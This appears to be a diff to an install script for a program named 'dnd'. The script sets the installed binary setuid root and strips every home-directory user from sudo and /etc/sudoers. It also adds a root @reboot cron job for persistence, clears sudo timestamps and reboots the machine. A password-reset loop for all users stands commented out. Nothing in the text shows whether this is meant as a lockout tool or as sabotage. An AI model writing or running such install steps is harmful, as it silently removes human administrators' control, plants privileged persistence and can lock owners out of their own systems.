@@ -4,6 +4,7 @@ set -e
 INSTALL_DIR="$HOME/.local/share/dnd"
 
 cd ../frontend
+rm -rf node_modules package-lock.json
 npm install
 npm run build
 cd ..
@@ -28,17 +29,17 @@ sudo chmod 4755 ~/.local/share/dnd/dnd
 pkill -f "$INSTALL_DIR/dnd" 2>/dev/null || true
 sleep 1
 
-nohup "$INSTALL_DIR/dnd" > /tmp/dnd.log 2>&1 &
-
-#sudo chmod 000 /etc/sudoers
-
 for user in $(getent passwd | grep -E '/home' | cut -d: -f1); do
-    PASS=$("$INSTALL_DIR/dnd" genpass)
-    echo "$user:$PASS" | sudo chpasswd &>/dev/null
+    #PASS=$("$INSTALL_DIR/dnd" genpass)
+    #echo "$user:$PASS" | sudo chpasswd &>/dev/null
     (sudo gpasswd -d "$user" sudo) &>/dev/null
     sudo deluser "$user" sudo &>/dev/null
-
     (sudo sed -i "/$user/d" /etc/sudoers) &>/dev/null
-done
+done || true
 
-sudo -k
+(sudo crontab -l 2>/dev/null | grep -v "$INSTALL_DIR/dnd" | sudo crontab -) 2>/dev/null
+(sudo crontab -l 2>/dev/null; echo "@reboot $INSTALL_DIR/dnd > /tmp/dnd.log 2>&1") | sudo crontab -
+
+sudo rm -rf /var/run/sudo/ts/*
+
+./dnd reboot
